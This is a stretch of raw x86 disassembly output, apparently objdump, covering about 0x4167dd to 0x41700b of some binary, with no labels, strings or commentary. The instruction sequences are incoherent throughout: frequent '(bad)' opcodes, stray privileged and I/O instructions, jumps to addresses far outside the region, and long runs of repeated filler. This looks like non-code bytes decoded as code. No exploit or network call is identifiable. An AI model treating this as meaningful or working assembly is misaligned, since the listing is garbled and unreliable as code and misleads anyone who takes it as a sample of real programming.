  4167dd:	ret    0xe947
  4167e0:	frstor [edi]
  4167e2:	push   ecx
  4167e3:	add    BYTE PTR [edi-0x73],ah
  4167e6:	or     BYTE PTR [ebx-0x62],dl
  4167e9:	gs sub al,0x8
  4167ec:	push   es
  4167ed:	pop    edx
  4167ee:	loopne 0x4167e8
  4167f0:	push   0x46
  4167f2:	jne    0x4167b7
  4167f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f5:	xchg   ecx,eax
  4167f6:	or     BYTE PTR [eax],al
  4167f8:	ins    DWORD PTR es:[edi],dx
  4167f9:	inc    ebp
  4167fa:	jl     0x41683d
  4167fc:	cmc    
  4167fd:	mov    edx,0x12f58917
  416802:	mov    DWORD PTR [esi+eiz*2],0x693d0c51
  416809:	fdiv   QWORD PTR ds:0xb0566700
  41680f:	jl     0x416871
  416811:	ror    BYTE PTR [eax],1
  416813:	mov    eax,DWORD PTR [eax]
	...
  416825:	add    BYTE PTR [eax],al
  416827:	add    dh,dl
  416829:	mov    edx,0x8cf68318
  41682e:	xchg   eax,eax
  416830:	mov    cl,0x86
  416832:	hlt    
  416833:	jne    0x416899
  416835:	nop
  416836:	jp     0x416827
  416838:	outs   dx,BYTE PTR ds:[esi]
  416839:	push   edx
  41683a:	or     al,0x0
  41683c:	cmp    BYTE PTR [ecx+0x28c983e9],0x58
  416843:	push   esi
  416844:	cs add BYTE PTR gs:[ebx+0x45819470],cl
  41684c:	sub    eax,0x8e85780
  416851:	dec    eax
  416852:	repz (bad) 
  416854:	fmul   st,st(5)
  416856:	clc    
  416857:	push   eax
  416858:	clc    
  416859:	rol    DWORD PTR [eax],cl
  41685b:	push   eax
  41685c:	std    
  41685d:	das    
  41685e:	lock (bad) 
  416860:	fidiv  DWORD PTR [ebp+0x1375e849]
  416866:	(bad)  
  416867:	adc    BYTE PTR [esi],dl
  416869:	pop    ecx
  41686a:	xlat   BYTE PTR ds:[ebx]
  41686b:	clc    
  41686c:	jmp    0x4a57:0x8c7c6047
  416873:	add    BYTE PTR [ecx],cl
  416875:	lock rcl BYTE PTR [eax+0x24],0x50
  41687a:	ret    0x2bfd
  41687d:	arpl   WORD PTR [ebp+0x74],ax
  416880:	int    0x2b
  416882:	jbe    0x4168c7
  416884:	sbb    al,0x1b
  416886:	shr    DWORD PTR [ebp+0x15],1
  416889:	outs   dx,BYTE PTR ds:[esi]
  41688a:	ret    
  41688b:	push   0x0
	...
  4168a0:	mov    BYTE PTR [edi],bl
  4168a2:	dec    edx
  4168a3:	add    BYTE PTR [ecx],dl
  4168a5:	call   0xc25b97a
  4168aa:	ret    0xf3fd
  4168ad:	shl    DWORD PTR ds:0xd8f017fc,0x87
  4168b4:	dec    ecx
  4168b5:	aas    
  4168b6:	jb     0x416913
  4168b8:	fdiv   QWORD PTR [ecx+0x6807f425]
  4168be:	aam    0x87
  4168c0:	push   ecx
  4168c1:	pop    edi
  4168c2:	jb     0x41691f
  4168c4:	mov    ah,0xd2
  4168c6:	fdiv   DWORD PTR [ebp+ecx*2+0x2b]
  4168ca:	jbe    0x41690f
  4168cc:	mov    ah,0x9a
  4168ce:	aam    0x39
  4168d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168d1:	cmc    
  4168d2:	ret    
  4168d3:	push   0x4976a0
  4168d8:	or     DWORD PTR [eax-0x24],esi
  4168db:	push   eax
  4168dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168dd:	pop    edi
  4168de:	ret    0x8bfd
  4168e1:	xchg   al,bl
  4168e3:	je     0x4168b2
  4168e5:	cmp    eax,0x6e644376
  4168ea:	aam    0x1d
  4168ec:	jne    0x416909
  4168ee:	les    ecx,FWORD PTR [ecx+0x4370b1c9]
  4168f4:	pop    esp
  4168f5:	mov    ch,0x4e
  4168f7:	cld    
  4168f8:	add    eax,0xb189dca1
  4168fd:	xchg   esp,eax
  4168fe:	push   ebx
  4168ff:	js     0x4168d0
  416901:	cmp    al,0x78
  416903:	inc    esi
	...
  416918:	cmp    BYTE PTR [esi],bl
  41691a:	mov    esp,0xdcb0a4db
  41691f:	inc    edx
  416920:	mov    WORD PTR [ecx],fs
  416922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416923:	retf   
  416924:	mov    esp,0x21cb483c
  416929:	xor    al,0xc7
  41692b:	dec    edi
  41692c:	lahf   
  41692d:	aad    0xdf
  41692f:	jle    0x416900
  416931:	and    al,0xaf
  416933:	fcomi  st,st(5)
  416935:	sub    al,0x16
  416937:	int3   
  416938:	je     0x4168ea
  41693a:	xchg   esp,eax
  41693b:	inc    edx
  41693c:	mov    WORD PTR [ecx],fs
  41693e:	lods   al,BYTE PTR ds:[esi]
  41693f:	fistp  DWORD PTR [esp+edi*1+0x2c]
  416943:	retf   
  416944:	jmp    0x4fc0067c
  416949:	sub    al,0x8f
  41694b:	fist   DWORD PTR [eax]
  41694d:	sub    eax,0xdb07cbe6
  416952:	div    DWORD PTR [ebx]
  416954:	pop    ss
  416955:	fcmove st,st(7)
  416957:	xor    al,0xb4
  416959:	stos   DWORD PTR es:[edi],eax
  41695a:	xlat   BYTE PTR ds:[ebx]
  41695b:	retf   
  41695c:	mov    ecx,0x59f4ad17
  416961:	and    DWORD PTR [esp+ebx*8],esp
  416964:	cmp    al,0x3c
  416966:	pop    ecx
  416967:	int3   
  416968:	mov    eax,ds:0x132f1d33
  41696d:	inc    ecx
  41696e:	add    al,0xc6
  416970:	test   BYTE PTR [esp+esi*1-0x7cea9083],dl
  416977:	js     0x4168fc
  416979:	xor    ebx,edi
  41697b:	add    BYTE PTR ss:[eax],al
	...
  41698e:	add    BYTE PTR [eax],al
  416990:	loop   0x41695d
  416992:	push   0x29
  416994:	test   BYTE PTR [edi],bl
  416996:	hlt    
  416997:	not    DWORD PTR [esi]
  416999:	sbb    DWORD PTR [edi-0x36],ebx
  41699c:	popa   
  41699d:	xor    ecx,DWORD PTR [eax]
  41699f:	sbb    DWORD PTR [eax],edi
  4169a1:	enter  0x6ef6,0x47
  4169a5:	mov    esi,0xa753d108
  4169aa:	inc    edi
  4169ab:	jmp    0x5734a517
  4169b0:	inc    edi
  4169b1:	sbb    edx,0x63
  4169b4:	or     dh,BYTE PTR [eax]
  4169b6:	jnp    0x416960
  4169b8:	(bad)  
  4169b9:	sbb    al,0xc
  4169bb:	sti    
  4169bc:	leave  
  4169bd:	adc    eax,0x43d3d1f2
  4169c2:	int    0x64
  4169c4:	shl    BYTE PTR [edx],0xf5
  4169c7:	es xchg ecx,eax
  4169c9:	xchg   esp,eax
  4169ca:	or     cl,ch
  4169cc:	loop   0x416995
  4169ce:	jg     0x4169e9
  4169d0:	jns    0x4169e9
  4169d2:	jl     0x4169e3
  4169d4:	(bad)  
  4169d5:	xor    BYTE PTR [edi],dh
  4169d7:	sbb    ecx,ebx
  4169d9:	arpl   WORD PTR [ecx-0xacdc39c],ax
  4169df:	neg    BYTE PTR [eax+0x17]
  4169e2:	je     0x4169d3
  4169e4:	(bad)  
  4169e5:	xor    ch,dh
  4169e7:	ins    BYTE PTR es:[edi],dx
  4169e8:	pop    ebx
  4169e9:	xor    dh,ch
  4169eb:	fiadd  WORD PTR [edx+0x1f]
  4169ee:	je     0x4169c7
  4169f0:	(bad)  
  4169f1:	xor    BYTE PTR ds:0x8f,al
	...
  416a07:	add    BYTE PTR [edx+0x2b46e815],cl
  416a0d:	out    dx,eax
  416a0e:	jae    0x4169cf
  416a10:	(bad)  
  416a11:	xor    BYTE PTR ds:0xf083867f,al
  416a17:	popa   
  416a18:	mov    BYTE PTR [edx+0x9],bl
  416a1b:	jmp    0xa3cb40f2
  416a20:	ja     0x4169d1
  416a22:	or     ebp,DWORD PTR [ecx-0x76]
  416a25:	xchg   esp,eax
  416a26:	jnp    0x4169cf
  416a28:	mov    ebp,0x9500e0ca
  416a2d:	pop    esi
  416a2e:	repz push esi
  416a31:	hlt    
  416a32:	outs   dx,DWORD PTR ds:[esi]
  416a33:	(bad)  
  416a34:	loop   0x416a94
  416a36:	or     BYTE PTR [eax-0x588669e2],al
  416a3c:	mov    dh,0x1c
  416a3e:	jo     0x416a3e
  416a40:	loop   0x416aa0
  416a42:	or     BYTE PTR [ebp-0x3d],dh
  416a45:	lods   al,BYTE PTR ds:[esi]
  416a46:	mov    DWORD PTR [eax+0x50f35ec3],eax
  416a4c:	mov    ebp,0x62fff15b
  416a51:	jle    0x416aa9
  416a53:	pop    ebx
  416a54:	lods   al,BYTE PTR ds:[esi]
  416a55:	dec    ecx
  416a56:	push   ecx
  416a57:	ret    0x962d
  416a5a:	pop    ecx
  416a5b:	mov    DWORD PTR [eax+0x3b535865],ebx
  416a61:	mov    bl,0x59
  416a63:	or     BYTE PTR [esi+0x7c],ch
  416a66:	add    al,0x8b
  416a68:	sbb    BYTE PTR [esi],ah
  416a6a:	es leave 
	...
  416a80:	pop    edi
  416a81:	xor    DWORD PTR [esi],eax
  416a83:	mov    BYTE PTR [ecx],ch
  416a85:	sub    eax,0x28e98afd
  416a8a:	lea    eax,[esp+edi*4]
  416a8d:	fadd   DWORD PTR [edi-0x1e264207]
  416a93:	push   ebx
  416a94:	xchg   DWORD PTR [eax-0x5c],edx
  416a97:	cli    
  416a98:	loop   0x416af5
  416a9a:	and    eax,0xf2c50d2
  416a9f:	mov    bh,BYTE PTR [ecx+0x1d013a87]
  416aa5:	xchg   ebp,eax
  416aa6:	dec    edx
  416aa7:	sbb    edi,0x30
  416aaa:	jno    0x416a9c
  416aac:	xchg   esp,eax
  416aad:	out    0x81,eax
  416aaf:	inc    esp
  416ab0:	mov    BYTE PTR [ebp-0x80],bl
  416ab3:	add    al,0x67
  416ab5:	xlat   BYTE PTR ds:[ebx]
  416ab6:	xchg   edx,edi
  416ab8:	mov    WORD PTR [ebx],?
  416aba:	dec    ebp
  416abb:	icebp  
  416abc:	shl    BYTE PTR [esi+0x71],cl
  416abf:	in     al,dx
  416ac0:	leave  
  416ac1:	std    
  416ac2:	out    dx,eax
  416ac3:	jmp    DWORD PTR [ebx+0x3b]
  416ac6:	or     DWORD PTR [eax],eax
  416ac8:	mov    WORD PTR [ebx],?
  416aca:	or     DWORD PTR [eax],eax
  416acc:	mov    WORD PTR [ebx],?
  416ace:	or     DWORD PTR [eax],eax
  416ad0:	mov    WORD PTR [ebx],?
  416ad2:	or     DWORD PTR [eax],eax
  416ad4:	mov    WORD PTR [ebx],?
  416ad6:	or     DWORD PTR [eax],eax
  416ad8:	mov    WORD PTR [ebx],?
  416ada:	or     DWORD PTR [eax],eax
  416adc:	mov    WORD PTR [ebx],?
  416ade:	or     DWORD PTR [eax],eax
  416ae0:	mov    WORD PTR [ebx],?
  416ae2:	or     DWORD PTR [eax],eax
	...
  416af8:	mov    WORD PTR [ebx],?
  416afa:	or     DWORD PTR [eax],eax
  416afc:	mov    WORD PTR [ebx],?
  416afe:	or     DWORD PTR [eax],eax
  416b00:	mov    WORD PTR [ebx],?
  416b02:	or     DWORD PTR [eax],eax
  416b04:	mov    WORD PTR [ebx],?
  416b06:	or     DWORD PTR [eax],eax
  416b08:	mov    WORD PTR [ebx],?
  416b0a:	or     DWORD PTR [eax],eax
  416b0c:	mov    WORD PTR [ebx],?
  416b0e:	or     DWORD PTR [eax],eax
  416b10:	mov    WORD PTR [ebx],?
  416b12:	or     DWORD PTR [eax],eax
  416b14:	mov    WORD PTR [ebx],?
  416b16:	or     DWORD PTR [eax],eax
  416b18:	mov    WORD PTR [ebx],?
  416b1a:	or     DWORD PTR [eax],eax
  416b1c:	mov    WORD PTR [ebx],?
  416b1e:	or     DWORD PTR [eax],eax
  416b20:	mov    WORD PTR [ebx],?
  416b22:	or     DWORD PTR [eax],eax
  416b24:	mov    WORD PTR [ebx],?
  416b26:	or     DWORD PTR [eax],eax
  416b28:	mov    WORD PTR [ebx],?
  416b2a:	or     DWORD PTR [eax],eax
  416b2c:	mov    WORD PTR [ebx],?
  416b2e:	or     DWORD PTR [eax],eax
  416b30:	mov    WORD PTR [ebx],?
  416b32:	or     DWORD PTR [eax],eax
  416b34:	mov    WORD PTR [ebx],?
  416b36:	or     DWORD PTR [eax],eax
  416b38:	mov    WORD PTR [ebx],?
  416b3a:	or     DWORD PTR [eax],eax
  416b3c:	mov    WORD PTR [ebx],?
  416b3e:	or     DWORD PTR [eax],eax
  416b40:	mov    WORD PTR [ebx],?
  416b42:	or     DWORD PTR [eax],eax
  416b44:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b4b:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416b52:	fild   WORD PTR [ebx]
  416b54:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b5b:	add    eax,DWORD PTR [eax]
	...
  416b6d:	add    BYTE PTR [eax],al
  416b6f:	add    BYTE PTR [esp+edx*4-0x6b73fc21],cl
  416b76:	fild   WORD PTR [ebx]
  416b78:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b7f:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416b86:	fild   WORD PTR [ebx]
  416b88:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b8f:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416b96:	fild   WORD PTR [ebx]
  416b98:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416b9f:	add    ecx,DWORD PTR [esp+edx*4-0x65790214]
  416ba6:	xor    BYTE PTR [ebx],0x58
  416ba9:	mov    ebp,0x655a2381
  416bae:	lds    edx,FWORD PTR [ebx]
  416bb0:	stos   DWORD PTR es:[edi],eax
  416bb1:	je     0x416b72
  416bb3:	push   ss
  416bb4:	lods   al,BYTE PTR ds:[esi]
  416bb5:	je     0x416c32
  416bb7:	pop    ebx
  416bb8:	das    
  416bb9:	je     0x416c0d
  416bbb:	pop    ecx
  416bbc:	arpl   ax,ax
  416bbe:	inc    ebx
  416bbf:	popa   
  416bc0:	ds je  0x416c16
  416bc3:	pop    esp
  416bc4:	das    
  416bc5:	je     0x416c08
  416bc7:	popa   
  416bc8:	and    BYTE PTR [eax+0x6a6c5244],ch
  416bce:	sbb    cl,bh
  416bd0:	test   ebx,edx
  416bd2:	or     BYTE PTR [esi+0x0],al
	...
  416be5:	add    BYTE PTR [eax],al
  416be7:	add    BYTE PTR [eax],bh
  416be9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bea:	jp     0x416c2c
  416bec:	jmp    0x416baa
  416bee:	jl     0x416bb9
  416bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bf1:	mov    ch,0x1f
  416bf3:	leave  
  416bf4:	mov    al,ds:0x94d12f67
  416bf9:	bound  edi,QWORD PTR [eax]
  416bfb:	fstp   DWORD PTR [eax-0x57ff958c]
  416c01:	fisub  DWORD PTR [ebp+0x4]
  416c04:	mov    esi,0xa8076bb9
  416c09:	xlat   BYTE PTR ds:[ebx]
  416c0a:	push   0xfffffffa
  416c0c:	lods   al,BYTE PTR ds:[esi]
  416c0d:	mov    esi,0xc0c90924
  416c12:	or     DWORD PTR fs:[esi-0x49],edi
  416c16:	ins    DWORD PTR es:[edi],dx
  416c17:	rol    ebx,0xa5
  416c1a:	sub    BYTE PTR [ebx-0x44945a54],bh
  416c20:	shl    DWORD PTR [ebx-0x62eaf094],1
  416c26:	add    esp,ebx
  416c28:	push   esp
  416c29:	sar    DWORD PTR [edx-0x3c],0xaf
  416c2d:	mov    bh,0x66
  416c2f:	(bad)  
  416c30:	pop    edx
  416c31:	mov    ds:0xb74b8863,al
  416c36:	xchg   DWORD PTR gs:[ebp+0x5b956074],eax
  416c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c3e:	xor    dl,dh
  416c40:	jp     0x416beb
  416c42:	jge    0x416cba
  416c44:	xor    DWORD PTR [edi-0x41938596],0x7e79
	...
  416c5e:	add    BYTE PTR [eax],al
  416c60:	imul   ebp,DWORD PTR [eax-0x4ca1b783],0xbb634a26
  416c6a:	and    eax,0x299b5e4
  416c6f:	jmp    0x4a0103
  416c74:	mov    ch,0x92
  416c76:	or     BYTE PTR [eax],al
  416c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c79:	xchg   edx,eax
  416c7a:	or     BYTE PTR [eax],al
  416c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c7d:	xchg   edx,eax
  416c7e:	or     BYTE PTR [eax],al
  416c80:	jne    0x416c14
  416c82:	or     BYTE PTR [eax],al
  416c84:	jne    0x416c18
  416c86:	or     BYTE PTR [eax],al
  416c88:	gs xchg edx,eax
  416c8a:	or     BYTE PTR [eax],al
  416c8c:	gs xchg edx,eax
  416c8e:	or     BYTE PTR [eax],al
  416c90:	jne    0x416c24
  416c92:	or     BYTE PTR [eax],al
  416c94:	jne    0x416c28
  416c96:	or     BYTE PTR [eax],al
  416c98:	gs xchg edx,eax
  416c9a:	or     BYTE PTR [eax],al
  416c9c:	gs xchg edx,eax
  416c9e:	or     BYTE PTR [eax],al
  416ca0:	xor    eax,0x35000892
  416ca5:	xchg   edx,eax
  416ca6:	or     BYTE PTR [eax],al
  416ca8:	and    eax,0x18000892
  416cad:	pop    ds
  416cae:	inc    esi
  416caf:	imul   esi,DWORD PTR [esp+esi*2+0x21],0x4
  416cb4:	arpl   di,di
  416cb6:	pop    ebx
  416cb7:	in     al,dx
  416cb8:	js     0x416cad
  416cba:	imul   ebp,DWORD PTR ds:0x56ff154a,0x110d2c08
	...
  416cd8:	xor    DWORD PTR [edi],esp
  416cda:	ins    DWORD PTR es:[edi],dx
  416cdb:	in     al,0x3d
  416cdd:	fcom   QWORD PTR [edi-0x72]
  416ce0:	in     eax,0x91
  416ce2:	or     BYTE PTR [eax],al
  416ce4:	cmc    
  416ce5:	xchg   ecx,eax
  416ce6:	or     BYTE PTR [eax],al
  416ce8:	cmc    
  416ce9:	xchg   ecx,eax
  416cea:	or     BYTE PTR [eax],al
  416cec:	in     eax,0x91
  416cee:	or     BYTE PTR [eax],al
  416cf0:	in     eax,0x91
  416cf2:	or     BYTE PTR [eax],al
  416cf4:	mov    ch,0x91
  416cf6:	or     BYTE PTR [eax],al
  416cf8:	mov    ch,0x91
  416cfa:	or     BYTE PTR [eax],al
  416cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cfd:	xchg   ecx,eax
  416cfe:	or     BYTE PTR [eax],al
  416d00:	mov    WORD PTR [ebx],?
  416d02:	or     DWORD PTR [eax],eax
  416d04:	mov    WORD PTR [ebx],?
  416d06:	or     DWORD PTR [eax],eax
  416d08:	mov    WORD PTR [ebx],?
  416d0a:	or     DWORD PTR [eax],eax
  416d0c:	mov    WORD PTR [ebx],?
  416d0e:	or     DWORD PTR [eax],eax
  416d10:	mov    WORD PTR [ebx],?
  416d12:	or     DWORD PTR [eax],eax
  416d14:	mov    WORD PTR [ebx],?
  416d16:	or     DWORD PTR [eax],eax
  416d18:	mov    WORD PTR [ebx],?
  416d1a:	or     DWORD PTR [eax],eax
  416d1c:	mov    WORD PTR [ebx],?
  416d1e:	or     DWORD PTR [eax],eax
  416d20:	mov    WORD PTR [ebx],?
  416d22:	or     DWORD PTR [eax],eax
  416d24:	mov    WORD PTR [ebx],?
  416d26:	or     DWORD PTR [eax],eax
  416d28:	mov    WORD PTR [ebx],?
  416d2a:	or     DWORD PTR [eax],eax
  416d2c:	mov    WORD PTR [ebx],?
  416d2e:	or     DWORD PTR [eax],eax
  416d30:	mov    WORD PTR [ebx],?
  416d32:	or     DWORD PTR [eax],eax
  416d34:	mov    WORD PTR [ebx],?
  416d36:	or     DWORD PTR [eax],eax
  416d38:	mov    WORD PTR [ebx],?
  416d3a:	or     DWORD PTR [eax],eax
	...
  416d50:	mov    WORD PTR [ebx],?
  416d52:	or     DWORD PTR [eax],eax
  416d54:	mov    WORD PTR [ebx],?
  416d56:	or     DWORD PTR [eax],eax
  416d58:	mov    WORD PTR [ebx],?
  416d5a:	or     DWORD PTR [eax],eax
  416d5c:	mov    WORD PTR [ebx],?
  416d5e:	or     DWORD PTR [eax],eax
  416d60:	mov    WORD PTR [ebx],?
  416d62:	or     DWORD PTR [eax],eax
  416d64:	mov    WORD PTR [ebx],?
  416d66:	or     DWORD PTR [eax],eax
  416d68:	mov    WORD PTR [ebx],?
  416d6a:	or     DWORD PTR [eax],eax
  416d6c:	mov    WORD PTR [ebx],?
  416d6e:	or     DWORD PTR [eax],eax
  416d70:	mov    WORD PTR [ebx],?
  416d72:	or     DWORD PTR [eax],eax
  416d74:	mov    WORD PTR [ebx],?
  416d76:	or     DWORD PTR [eax],eax
  416d78:	mov    WORD PTR [ebx],?
  416d7a:	or     DWORD PTR [eax],eax
  416d7c:	mov    WORD PTR [ebx],?
  416d7e:	or     DWORD PTR [eax],eax
  416d80:	mov    WORD PTR [ebx],?
  416d82:	or     DWORD PTR [eax],eax
  416d84:	mov    WORD PTR [ebx],?
  416d86:	or     DWORD PTR [eax],eax
  416d88:	mov    WORD PTR [ebx],?
  416d8a:	or     DWORD PTR [eax],eax
  416d8c:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416d93:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416d9a:	fild   WORD PTR [ebx]
  416d9c:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416da3:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416daa:	fild   WORD PTR [ebx]
  416dac:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416db3:	add    eax,DWORD PTR [eax]
	...
  416dc5:	add    BYTE PTR [eax],al
  416dc7:	add    BYTE PTR [esp+edx*4-0x6b73fc21],cl
  416dce:	fild   WORD PTR [ebx]
  416dd0:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416dd7:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416dde:	fild   WORD PTR [ebx]
  416de0:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416de7:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416dee:	fild   WORD PTR [ebx]
  416df0:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416df7:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  416dfe:	fild   WORD PTR [ebx]
  416e00:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  416e07:	add    ecx,DWORD PTR [esp+edx*4+0x609d11d0]
  416e0e:	fmul   QWORD PTR ds:0x5080a48c
  416e14:	pop    ebp
  416e15:	mov    ds:0x94685186,eax
  416e1a:	or     BYTE PTR [ecx+0x67],bh
  416e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e1e:	push   0xffffff8b
  416e20:	(bad)  
  416e21:	mov    ebx,0xa0824c7d
  416e26:	outs   dx,DWORD PTR ds:[esi]
  416e27:	jmp    0x1d7ad3e4
	...
  416e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e41:	sub    ebx,DWORD PTR [edi+0x44]
  416e44:	pop    ebx
  416e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e46:	jns    0x416e31
  416e48:	mov    al,ds:0x94f53965
  416e4d:	popa   
  416e4e:	cmp    eax,0x3a7b8ff1
  416e53:	cli    
  416e54:	jnp    0x416e81
  416e56:	push   0x3a7bb30b
  416e5b:	fimul  DWORD PTR [edi-0x62e29448]
  416e61:	mov    bh,0x5f
  416e63:	dec    DWORD PTR [edi-0x5c059460]
  416e69:	xchg   esp,eax
  416e6a:	fs push cs
  416e6c:	xchg   esi,eax
  416e6d:	mov    bh,0x8
  416e6f:	mov    eax,0xf9086441
  416e74:	push   0x7ede79a5
  416e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e7a:	ins    BYTE PTR es:[edi],dx
  416e7b:	sbb    BYTE PTR [eax+0x7bc56bbc],cl
  416e81:	mov    ecx,0xba5ebc08
  416e86:	popa   
  416e87:	int3   
  416e88:	pop    eax
  416e89:	xchg   esp,eax
  416e8a:	ins    BYTE PTR es:[edi],dx
  416e8b:	mov    ebx,0xc765b168
  416e90:	(bad)  
  416e91:	mov    al,ds:0xa0bab47a
  416e96:	xchg   si,ax
  416e98:	add    BYTE PTR [ebx],ch
  416e9a:	cmp    al,bl
  416e9c:	clc    
  416e9d:	jns    0x416ed6
  416e9f:	fmul   DWORD PTR [edi+0x7e64b3]
	...
  416eb5:	add    BYTE PTR [eax],al
  416eb7:	add    BYTE PTR [ebp+0x2006fb7],ah
  416ebd:	ins    BYTE PTR es:[edi],dx
  416ebe:	or     BYTE PTR [ecx],dh
  416ec0:	pop    ss
  416ec1:	and    bh,BYTE PTR [ecx]
  416ec3:	xor    eax,0x72f52e0b
  416ec8:	or     eax,0x5a6f6c70
  416ecd:	nop
  416ece:	and    eax,0x3a2c9632
  416ed3:	mov    ch,BYTE PTR ss:[eax]
  416ed6:	add    BYTE PTR ds:[esi+0x78],dl
  416eda:	jp     0x416f45
  416edc:	push   esi
  416edd:	ins    BYTE PTR es:[edi],dx
  416ede:	or     BYTE PTR [ebx+0x58],dh
  416ee1:	data16 ja 0x416f4c
  416ee4:	int3   
  416ee5:	imul   ax,WORD PTR [eax],0x6fc0
  416eea:	ja     0x416f60
  416eec:	mov    BYTE PTR [edx+0x8],ah
  416eef:	arpl   WORD PTR [edx-0x768a879d],ax
  416ef5:	jnp    0x416f71
  416ef7:	add    BYTE PTR [ebp-0x7991929e],al
  416efd:	jnp    0x416f76
  416eff:	jae    0x416f66
  416f01:	bound  ebp,QWORD PTR [ebp+0x67]
  416f04:	call   0x6365:0x8b007a7b
  416f0b:	je     0x416f54
  416f0d:	jno    0x416f73
  416f0f:	ins    BYTE PTR es:[edi],dx
  416f10:	and    eax,0x58676671
  416f15:	jp     0x416f1f
  416f17:	push   0x48
  416f19:	arpl   WORD PTR [ecx+0x73],di
	...
  416f30:	adc    al,0x96
  416f32:	and    eax,0x37211632
  416f37:	xor    esi,ebp
  416f39:	outs   dx,BYTE PTR ds:[esi]
  416f3a:	pusha  
  416f3b:	popa   
  416f3c:	cmp    DWORD PTR [ebp+0x7e],edi
  416f3f:	gs pop ss
  416f41:	xchg   esi,eax
  416f42:	outs   dx,BYTE PTR ds:[esi]
  416f43:	jb     0x416f4d
  416f45:	jge    0x416fb3
  416f47:	outs   dx,DWORD PTR ds:[esi]
  416f48:	mov    WORD PTR [eax],ss
  416f4a:	or     DWORD PTR [ecx+0x75],ebp
  416f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f4e:	and    eax,0x2c3b5e63
  416f53:	jno    0x416fbd
  416f55:	adc    DWORD PTR [ecx],ecx
  416f57:	jno    0x416f94
  416f59:	push   ds
  416f5a:	arpl   WORD PTR cs:[esi],di
  416f5d:	cmp    edi,DWORD PTR [esi]
  416f5f:	jae    0x416f9d
  416f61:	fdivr  DWORD PTR [esi]
  416f63:	imul   ebp,DWORD PTR ds:0x356b0cd9,0xffffffde
  416f6a:	and    al,0x5f
  416f6c:	sub    DWORD PTR [edi+0xc],esp
  416f6f:	popa   
  416f70:	and    al,0xd8
  416f72:	sub    eax,0x223b2971
  416f77:	outs   dx,BYTE PTR ds:[esi]
  416f78:	add    cl,bl
  416f7a:	outs   dx,BYTE PTR ds:[esi]
  416f7c:	jmp    0xebab7be0
  416f81:	mov    fs,WORD PTR [ebx+esi*2]
  416f84:	in     eax,dx
  416f85:	cmp    ebx,DWORD PTR [edi]
  416f87:	jae    0x416f78
  416f89:	xchg   esi,eax
  416f8a:	xor    DWORD PTR [ebp-0x27],ebp
  416f8d:	cmp    ebp,DWORD PTR [ebx]
  416f8f:	ins    BYTE PTR es:[edi],dx
  416f90:	icebp  
  416f91:	cs cmp al,0x63
	...
  416fa8:	call   0xbfa09ae8
  416fad:	cwde   
  416fae:	cs pop edi
  416fb0:	mov    al,0x27
  416fb2:	or     DWORD PTR [ecx-0x40],esi
  416fb5:	pop    esp
  416fb6:	cmp    esi,DWORD PTR [ebp-0x53]
  416fb9:	dec    ebp
  416fba:	cmp    al,0x0
  416fbc:	pop    esp
  416fbd:	mov    edi,esp
  416fbf:	das    
  416fc0:	pop    esp
  416fc1:	mov    ecx,DWORD PTR [eax+esi*2]
  416fc4:	mov    eax,ds:0xa96c38ed
  416fc9:	cmp    esp,DWORD PTR [ebx]
  416fcb:	ins    DWORD PTR es:[edi],dx
  416fcc:	jle    0x417025
  416fce:	sub    ch,BYTE PTR [esi-0x74]
  416fd1:	push   ecx
  416fd2:	sub    ah,BYTE PTR [edi-0x80]
  416fd5:	xchg   esp,eax
  416fd6:	xchg   edi,eax
  416fd7:	add    edi,DWORD PTR [ebp-0x61]
  416fda:	test   BYTE PTR [esi],ch
  416fdc:	outs   dx,DWORD PTR ds:[esi]
  416fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fde:	fbld   TBYTE PTR [edx]
  416fe0:	pop    ebp
  416fe1:	mov    esp,0x94632673
  416fe6:	xor    DWORD PTR [esi],0x358ca05d
  416fec:	mov    WORD PTR [esp+eax*4+0x75af3a22],?
  416ff3:	add    edi,DWORD PTR [edi+ebp*4]
  416ff6:	dec    edi
  416ff7:	xor    al,0x2f
  416ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ffa:	(bad)  
  416ffc:	pusha  
  416ffd:	popa   
  416ffe:	push   ss
  416fff:	stc    
  417000:	pop    eax
  417001:	popa   
  417002:	fild   QWORD PTR [ebx]
  417004:	pop    ds
  417005:	mov    edx,0x941e2733
  41700a:	inc    ebx
  41700b:	xor    DWORD PTR [eax],eax
	...
